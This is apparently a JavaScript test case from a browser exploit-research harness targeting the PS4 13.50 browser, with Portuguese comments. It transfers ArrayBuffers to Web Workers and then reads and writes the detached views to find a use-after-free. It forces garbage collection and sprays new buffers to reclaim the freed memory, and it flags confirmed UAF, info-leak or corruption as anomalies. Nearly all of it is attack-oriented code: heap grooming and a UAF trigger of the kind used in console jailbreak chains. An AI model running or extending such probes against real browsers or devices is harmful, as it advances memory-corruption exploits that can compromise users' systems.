/**
 * TEST: Worker Transfer UAF (Use-After-Free)
 * Transfere ArrayBuffer para worker e tenta usar após transferência
 * PS4 13.50: Worker=true, MessageChannel=true
 */

export const testWorkerTransferUaf = {
    id: 'WORKER_TRANSFER_UAF',
    name: 'Worker Transfer UAF',
    risk: 'CRITICAL',
    category: 'WORKER',
    description: 'UAF via transferência de ArrayBuffer para worker com acesso pós-detach',
    ps4Compatible: true,

    setup: function() {
        this.BUFFER_SIZE = 256;
        this.WORKER_COUNT = 5;
        this.SPY_COUNT = 100;

        // Buffers que serão transferidos
        this.transferBuffers = [];
        this.transferViews = [];
        this.transferWorkers = [];

        for (let i = 0; i < this.WORKER_COUNT; i++) {
            const buf = new ArrayBuffer(this.BUFFER_SIZE);
            const view = new Uint32Array(buf);
            for (let j = 0; j < view.length; j++) {
                view[j] = 0xDEAD0000 + (i * 1000) + j;
            }
            this.transferBuffers.push(buf);
            this.transferViews.push(view);

            // Cria worker para receber
            if (typeof Worker !== 'undefined') {
                try {
                    const code = `
                        self.onmessage = function(e) {
                            const buffer = e.data;
                            try {
                                const view = new Uint32Array(buffer);
                                const firstByte = view[0];
                                self.postMessage({ 
                                    status: 'received',
                                    firstValue: firstByte,
                                    byteLength: buffer.byteLength
                                });
                            } catch(err) {
                                self.postMessage({ 
                                    status: 'error',
                                    error: err.message
                                });
                            }
                        };
                    `;
                    const blob = new Blob([code], { type: 'application/javascript' });
                    const worker = new Worker(URL.createObjectURL(blob));
                    this.transferWorkers.push(worker);
                } catch (e) {
                    this.transferWorkers.push(null);
                }
            } else {
                this.transferWorkers.push(null);
            }
        }

        // Spy buffers (preenchem o heap após transferência)
        this.spyBuffers = [];
        for (let i = 0; i < this.SPY_COUNT; i++) {
            const buf = new ArrayBuffer(64);
            const view = new Uint32Array(buf);
            view.fill(0xBBBB0000 + i);
            this.spyBuffers.push({ buffer: buf, view: view, index: i });
        }

        // Resultados
        this.transferResults = [];
        this.uafDetected = false;
        this.leakedSpyData = null;
    },

    probe: [
        // Probe 0: byteLength do primeiro buffer transferido
        function(scenario) {
            try {
                return scenario.transferBuffers[0]?.byteLength ?? 'DETACHED';
            } catch (e) {
                return 'ERROR_' + e.message.slice(0, 20);
            }
        },

        // Probe 1: Primeiro view após transferência
        function(scenario) {
            try {
                return scenario.transferViews[0]?.[0] ?? 'DETACHED';
            } catch (e) {
                return 'UAF_ERROR: ' + e.message.slice(0, 30);
            }
        },

        // Probe 2: Spy buffer 0 íntegro?
        function(scenario) {
            try {
                return '0x' + scenario.spyBuffers[0]?.view[0]?.toString(16) ?? 'MISSING';
            } catch (e) {
                return 'ERROR';
            }
        },

        // Probe 3: Workers ativos
        function(scenario) {
            return scenario.transferWorkers.filter(w => w !== null).length;
        },

        // Probe 4: Transfer results
        function(scenario) {
            return scenario.transferResults.length;
        }
    ],

    trigger: function() {
        this.transferResults = [];

        // Ataque 1: Transfere buffer e imediatamente tenta acessar
        for (let i = 0; i < this.transferWorkers.length; i++) {
            const worker = this.transferWorkers[i];
            const buffer = this.transferBuffers[i];
            const view = this.transferViews[i];

            if (!worker || !buffer) continue;

            worker.onmessage = (e) => {
                this.transferResults.push({
                    worker: i,
                    response: e.data,
                    timestamp: performance.now()
                });
            };

            // Transfere o buffer
            try {
                worker.postMessage(buffer, [buffer]);
            } catch (e) {
                this.transferResults.push({
                    worker: i,
                    transferError: e.message
                });
            }

            // Tenta acessar IMEDIATAMENTE após transferência
            try {
                const val = view[0];
                if (val !== undefined) {
                    this.uafDetected = true;
                    this.transferResults.push({
                        worker: i,
                        uafAccess: 'SUCCESS',
                        value: '0x' + val.toString(16)
                    });
                }
            } catch (e) {
                // Esperado: detached buffer
            }

            // Tenta escrever após transferência
            try {
                view[0] = 0x13371337;
                if (view[0] === 0x13371337) {
                    this.uafDetected = true;
                    this.transferResults.push({
                        worker: i,
                        uafWrite: 'SUCCESS',
                        message: 'Escrita em buffer detached funcionou!'
                    });
                }
            } catch (e) {
                // Esperado
            }
        }

        // Ataque 2: Força GC e realoca no mesmo espaço
        if (typeof gc === 'function') {
            gc();
            gc();
        }

        // Aloca novos buffers (podem ocupar espaço dos transferidos)
        this.newBuffers = [];
        for (let i = 0; i < 50; i++) {
            const buf = new ArrayBuffer(this.BUFFER_SIZE);
            const view = new Uint32Array(buf);
            view.fill(0xCAFE0000 + i);
            this.newBuffers.push({ buffer: buf, view: view });
        }

        // Verifica se os views originais agora apontam para dados novos
        for (let i = 0; i < this.transferViews.length; i++) {
            try {
                const val = this.transferViews[i][0];
                if (val !== undefined && (val & 0xFFFF0000) === 0xCAFE0000) {
                    this.leakedSpyData = {
                        viewIndex: i,
                        expectedDead: true,
                        actualValue: '0x' + val.toString(16),
                        likelyNewBuffer: val & 0xFFFF
                    };
                }
            } catch (e) {
                // Buffer detached
            }
        }

        // Ataque 3: Termina workers abruptamente
        for (const worker of this.transferWorkers) {
            try { worker?.terminate(); } catch (e) {}
        }
    },

    cleanup: function() {
        for (const worker of this.transferWorkers) {
            try { worker?.terminate(); } catch (e) {}
        }
        this.transferBuffers = null;
        this.transferViews = null;
        this.transferWorkers = null;
        this.spyBuffers = null;
        this.newBuffers = null;
    },

    customValidator: function(baseResults, afterResults) {
        // UAF detectado
        if (this.uafDetected) {
            const details = this.transferResults?.filter(r => r.uafAccess || r.uafWrite);
            return {
                anomaly: true,
                reason: `💥💥💥 UAF CONFIRMADO: ${details?.length || 0} acessos após transferência! ${JSON.stringify(details?.slice(0, 3))}`
            };
        }

        // Leak de dados novos via view antigo
        if (this.leakedSpyData) {
            return {
                anomaly: true,
                reason: `💥 UAF INFO LEAK: View antigo agora vê dados do buffer ${this.leakedSpyData.likelyNewBuffer}: ${this.leakedSpyData.actualValue}`
            };
        }

        // Spy buffer corrompido
        if (afterResults[2] && afterResults[2] !== '0xbbbb0000') {
            return {
                anomaly: true,
                reason: `🏆 SPY CORRUPTION: Spy buffer alterado para ${afterResults[2]}`
            };
        }

        return { anomaly: false, reason: '' };
    }
};
